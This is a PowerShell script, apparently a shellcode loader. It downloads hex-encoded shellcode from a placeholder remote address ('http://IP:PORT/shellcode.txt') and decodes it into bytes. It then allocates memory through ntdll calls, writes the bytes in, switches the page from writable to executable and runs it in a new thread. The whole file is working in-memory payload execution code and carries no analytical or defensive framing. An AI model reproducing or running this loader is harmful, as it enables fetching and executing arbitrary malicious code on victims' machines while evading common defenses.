# URL from which to download the shellcode file
$url = "http://IP:PORT/shellcode.txt"

# Download the shellcode from the URL
$shellcodeText = (New-Object System.Net.WebClient).DownloadString($url)

# Split the shellcode text into individual hexadecimal byte strings
$hexStrings = $shellcodeText -split ','

# Parse each hexadecimal byte string and convert it to a byte array
$shellcodeBytes = $hexStrings | ForEach-Object { [byte]::Parse($_.Trim().Substring(2), 'HexNumber') }

# Load necessary WinAPI functions
Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class NtDll {
        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@

# Allocate memory in the current process
$processHandle = [NtDll]::GetCurrentProcess()
$baseAddress = [IntPtr]::Zero
$regionSize = [IntPtr]::new($shellcodeBytes.Length)
$allocationType = 0x3000  # MEM_COMMIT | MEM_RESERVE
$protect = 0x40  # PAGE_READWRITE

$allocationResult = [NtDll]::NtAllocateVirtualMemory($processHandle, [ref]$baseAddress, [IntPtr]::Zero, [ref]$regionSize, $allocationType, $protect)

if ($allocationResult -eq 0) {
    # Copy the shellcode to the allocated memory
    $bytesWritten = 0
    [NtDll]::WriteProcessMemory($processHandle, $baseAddress, $shellcodeBytes, $shellcodeBytes.Length, [ref]$bytesWritten)

    # Change memory protection to PAGE_EXECUTE_READ
    $oldProtect = 0
    $protect = 0x20  # PAGE_EXECUTE_READ
    [NtDll]::NtProtectVirtualMemory($processHandle, [ref]$baseAddress, [ref]$regionSize, $protect, [ref]$oldProtect)

    # Execute the shellcode by creating a new thread
    $threadHandle = [NtDll]::CreateThread([IntPtr]::Zero, 0, $baseAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    [NtDll]::WaitForSingleObject($threadHandle, 4000)

    # Cleanup
    [NtDll]::CloseHandle($threadHandle)
} else {
    Write-Host "Failed to allocate memory."
}
Start-Sleep 3500;
